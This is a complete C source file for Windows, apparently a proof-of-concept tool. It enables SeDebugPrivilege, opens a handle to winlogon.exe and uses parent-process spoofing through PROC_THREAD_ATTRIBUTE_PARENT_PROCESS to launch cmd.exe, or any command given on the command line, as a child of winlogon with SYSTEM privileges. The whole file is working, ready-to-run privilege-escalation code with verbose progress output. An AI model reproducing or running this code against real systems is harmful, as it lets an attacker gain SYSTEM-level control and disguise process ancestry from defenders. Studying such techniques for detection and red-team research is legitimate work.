#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>

// No need to redefine ERROR_INSUFFICIENT_BUFFER as it's already in winerror.h

// Function prototypes
LPWSTR GetWin32ErrorMessage(DWORD errorCode);
void FreeErrorMessage(LPWSTR message);
BOOL EnableSeDebugPrivilege();
BOOL CreateProcessFromHandle(HANDLE hProcess, LPCWSTR command);
HANDLE OpenWinlogonHandle();

// Function to enable SeDebugPrivilege
BOOL EnableSeDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    BOOL result = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LPWSTR errorMsg = GetWin32ErrorMessage(GetLastError());
        wprintf(L"[-] Failed to open process token.\n");
        wprintf(L"    |-> %s\n", errorMsg);
        FreeErrorMessage(errorMsg);
        return FALSE;
    }

    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid)) {
        LPWSTR errorMsg = GetWin32ErrorMessage(GetLastError());
        wprintf(L"[-] Failed to lookup SeDebugPrivilege.\n");
        wprintf(L"    |-> %s\n", errorMsg);
        FreeErrorMessage(errorMsg);
        CloseHandle(hToken);
        return FALSE;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL)) {
        LPWSTR errorMsg = GetWin32ErrorMessage(GetLastError());
        wprintf(L"[-] Failed to adjust token privileges.\n");
        wprintf(L"    |-> %s\n", errorMsg);
        FreeErrorMessage(errorMsg);
    } else {
        DWORD lastError = GetLastError();
        if (lastError == ERROR_NOT_ALL_ASSIGNED) {
            wprintf(L"[-] SeDebugPrivilege could not be enabled. The privilege is not held by the calling process.\n");
            wprintf(L"[!] Make sure you're running as Administrator or have SeDebugPrivilege assigned.\n");
            result = FALSE;
        } else {
            wprintf(L"[+] SeDebugPrivilege enabled successfully.\n");
            result = TRUE;
        }
    }

    CloseHandle(hToken);
    return result;
}

// Function to get Windows error message
LPWSTR GetWin32ErrorMessage(DWORD errorCode) {
    LPWSTR messageBuffer = NULL;
    DWORD size = FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPWSTR)&messageBuffer,
        0,
        NULL
    );

    if (size == 0) {
        // If FormatMessage fails, create a generic error message
        messageBuffer = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 64 * sizeof(WCHAR));
        if (messageBuffer) {
            swprintf(messageBuffer, 64, L"[ERROR] Code 0x%08X", errorCode);
        }
    } else {
        // Remove trailing newline characters
        while (size > 0 && (messageBuffer[size - 1] == L'\r' || messageBuffer[size - 1] == L'\n')) {
            messageBuffer[--size] = L'\0';
        }
    }

    return messageBuffer;
}

// Function to free error message buffer
void FreeErrorMessage(LPWSTR message) {
    if (message) {
        LocalFree(message);
    }
}



BOOL CreateProcessFromHandle(HANDLE hProcess, LPCWSTR command)
{
    BOOL status = FALSE;
    SIZE_T size = 0;
    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = NULL;
    STARTUPINFOEXW si;
    PROCESS_INFORMATION pi;
    DWORD error;
    
    wprintf(L"[>] Entering CreateProcessFromHandle function...\n");
    wprintf(L"[>] Target command: %s\n", command);
    wprintf(L"[>] Parent handle: 0x%p\n", hProcess);
    
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.StartupInfo.cb = sizeof(si);

    wprintf(L"[>] Initializing process thread attribute list...\n");

    // Initialize with retry logic similar to C# version
    do {
        wprintf(L"[>] Calling InitializeProcThreadAttributeList (size=%zu)...\n", size);
        status = InitializeProcThreadAttributeList(pAttrList, 1, 0, &size);
        error = GetLastError();
        wprintf(L"[>] InitializeProcThreadAttributeList returned: %s (error=%lu, size=%zu)\n", 
                status ? L"TRUE" : L"FALSE", error, size);

        if (!status) {
            if (pAttrList != NULL) {
                wprintf(L"[>] Freeing previous attribute list...\n");
                HeapFree(GetProcessHeap(), 0, pAttrList);
                pAttrList = NULL;
            }

            if (error == ERROR_INSUFFICIENT_BUFFER) {
                wprintf(L"[>] Allocating %zu bytes for attribute list...\n", size);
                pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
                if (!pAttrList) {
                    LPWSTR errorMsg = GetWin32ErrorMessage(GetLastError());
                    wprintf(L"[-] HeapAlloc failed.\n");
                    wprintf(L"    |-> %s\n", errorMsg);
                    FreeErrorMessage(errorMsg);
                    return FALSE;
                }
                wprintf(L"[>] Attribute list allocated at: 0x%p\n", pAttrList);
            } else {
                LPWSTR errorMsg = GetWin32ErrorMessage(error);
                wprintf(L"[-] InitializeProcThreadAttributeList failed with unexpected error.\n");
                wprintf(L"    |-> %s\n", errorMsg);
                FreeErrorMessage(errorMsg);
                break; // Exit loop if error is not insufficient buffer
            }
        }
    } while (!status && error == ERROR_INSUFFICIENT_BUFFER);

    // Check if initialization was successful
    if (!status) {
        LPWSTR errorMsg = GetWin32ErrorMessage(error);
        wprintf(L"[-] Failed to initialize thread attribute list.\n");
        wprintf(L"    |-> %s\n", errorMsg);
        FreeErrorMessage(errorMsg);
        
        if (pAttrList) {
            HeapFree(GetProcessHeap(), 0, pAttrList);
        }
        return FALSE;
    }

    wprintf(L"[+] Process thread attribute list initialized successfully.\n");
    wprintf(L"[>] Updating process thread attribute...\n");

    // Update process thread attribute
    status = UpdateProcThreadAttribute(
            pAttrList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hProcess,
            sizeof(HANDLE),
            NULL,
            NULL);

    if (!status) {
        error = GetLastError();
        LPWSTR errorMsg = GetWin32ErrorMessage(error);
        wprintf(L"[-] Failed to update thread attribute.\n");
        wprintf(L"    |-> %s\n", errorMsg);
        FreeErrorMessage(errorMsg);
        
        DeleteProcThreadAttributeList(pAttrList);
        HeapFree(GetProcessHeap(), 0, pAttrList);
        return FALSE;
    }

    wprintf(L"[+] Process thread attribute updated successfully.\n");
    si.lpAttributeList = pAttrList;

    wprintf(L"[>] Calling CreateProcessW...\n");
    wprintf(L"[>] Command line: %s\n", command);

    // Create a mutable copy of the command string
    int cmdLen = wcslen(command) + 1;
    LPWSTR cmdCopy = (LPWSTR)HeapAlloc(GetProcessHeap(), 0, cmdLen * sizeof(WCHAR));
    if (!cmdCopy) {
        wprintf(L"[-] Failed to allocate memory for command copy.\n");
        DeleteProcThreadAttributeList(pAttrList);
        HeapFree(GetProcessHeap(), 0, pAttrList);
        return FALSE;
    }
    wcscpy(cmdCopy, command);

    // Create the process
    status = CreateProcessW(
        NULL,                   // lpApplicationName
        cmdCopy,               // lpCommandLine (must be mutable)
        NULL,                   // lpProcessAttributes
        NULL,                   // lpThreadAttributes
        FALSE,                  // bInheritHandles
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, // dwCreationFlags
        NULL,                   // lpEnvironment
        NULL,                   // lpCurrentDirectory
        &si.StartupInfo,       // lpStartupInfo
        &pi);                  // lpProcessInformation

    wprintf(L"[>] CreateProcessW returned: %s\n", status ? L"TRUE" : L"FALSE");

    if (!status) {
        error = GetLastError();
        LPWSTR errorMsg = GetWin32ErrorMessage(error);
        wprintf(L"[-] Failed to create new process.\n");
        wprintf(L"    |-> %s\n", errorMsg);
        FreeErrorMessage(errorMsg);
    } else {
        wprintf(L"[+] New process is created successfully.\n");
        wprintf(L"    |-> PID : %lu\n", pi.dwProcessId);
        wprintf(L"    |-> TID : %lu\n", pi.dwThreadId);
        wprintf(L"    |-> Process Handle: 0x%p\n", pi.hProcess);
        wprintf(L"    |-> Thread Handle: 0x%p\n", pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    // Cleanup
    HeapFree(GetProcessHeap(), 0, cmdCopy);
    DeleteProcThreadAttributeList(pAttrList);
    HeapFree(GetProcessHeap(), 0, pAttrList);
    
    wprintf(L"[>] Exiting CreateProcessFromHandle function...\n");
    return status;
}

HANDLE OpenWinlogonHandle()
{
    HANDLE hSnap;
    PROCESSENTRY32W pe;
    HANDLE hProcess = NULL;
    DWORD error;

    wprintf(L"[>] Searching winlogon PID.\n");

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        error = GetLastError();
        LPWSTR errorMsg = GetWin32ErrorMessage(error);
        wprintf(L"[-] CreateToolhelp32Snapshot failed.\n");
        wprintf(L"    |-> %s\n", errorMsg);
        FreeErrorMessage(errorMsg);
        return NULL;
    }

    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                wprintf(L"[+] PID of winlogon: %lu\n", pe.th32ProcessID);
                wprintf(L"[>] Trying to get handle to winlogon.\n");
                
                hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
                if (hProcess == NULL) {
                    error = GetLastError();
                    LPWSTR errorMsg = GetWin32ErrorMessage(error);
                    wprintf(L"[-] Failed to get a winlogon handle.\n");
                    wprintf(L"    |-> %s\n", errorMsg);
                    FreeErrorMessage(errorMsg);
                    
                    // Try with different access rights for debugging
                    wprintf(L"[>] Trying with PROCESS_ALL_ACCESS...\n");
                    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                    if (hProcess == NULL) {
                        error = GetLastError();
                        LPWSTR errorMsg2 = GetWin32ErrorMessage(error);
                        wprintf(L"[-] Failed to get winlogon handle with PROCESS_ALL_ACCESS.\n");
                        wprintf(L"    |-> %s\n", errorMsg2);
                        FreeErrorMessage(errorMsg2);
                    } else {
                        wprintf(L"[+] Got handle to winlogon with PROCESS_ALL_ACCESS (hProcess = 0x%p).\n", hProcess);
                    }
                } else {
                    wprintf(L"[+] Got handle to winlogon with PROCESS_CREATE_PROCESS (hProcess = 0x%p).\n", hProcess);
                }
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    } else {
        error = GetLastError();
        LPWSTR errorMsg = GetWin32ErrorMessage(error);
        wprintf(L"[-] Process32FirstW failed.\n");
        wprintf(L"    |-> %s\n", errorMsg);
        FreeErrorMessage(errorMsg);
    }

    CloseHandle(hSnap);

    if (hProcess == NULL) {
        wprintf(L"[-] Failed to get process ID of winlogon.\n");
    }

    return hProcess;
}

int wmain(int argc, wchar_t* argv[])
{
    wprintf(L"[*] If you have SeDebugPrivilege, you can get handles from privileged processes.\n");
    wprintf(L"[*] This PoC tries to spawn a process as winlogon.exe's child process.\n");

    // First, enable SeDebugPrivilege
    wprintf(L"[>] Attempting to enable SeDebugPrivilege...\n");
    if (!EnableSeDebugPrivilege()) {
        wprintf(L"[-] Failed to enable SeDebugPrivilege. Continuing anyway...\n");
        wprintf(L"[!] Note: You may need to run as Administrator or have SeDebugPrivilege assigned.\n");
    }

    LPCWSTR command = L"C:\\Windows\\System32\\cmd.exe";

    if (argc > 1) {
        command = argv[1];
        wprintf(L"[>] Command parameter detected, launching: %s\n", command);
    } else {
        wprintf(L"[>] No command parameter detected, launching cmd.exe\n");
    }

    HANDLE hProcess = OpenWinlogonHandle();
    if (hProcess) {
        wprintf(L"[>] Attempting to create process from winlogon handle...\n");
        BOOL success = CreateProcessFromHandle(hProcess, command);
        if (success) {
            wprintf(L"[+] Process creation succeeded!\n");
        } else {
            wprintf(L"[-] Process creation failed.\n");
        }
        CloseHandle(hProcess);
    } else {
        wprintf(L"[-] Failed to get winlogon handle. Cannot proceed.\n");
        wprintf(L"[!] Make sure you're running as Administrator.\n");
    }

    wprintf(L"[*] Press Enter to exit...\n");
    getchar();
    return 0;
}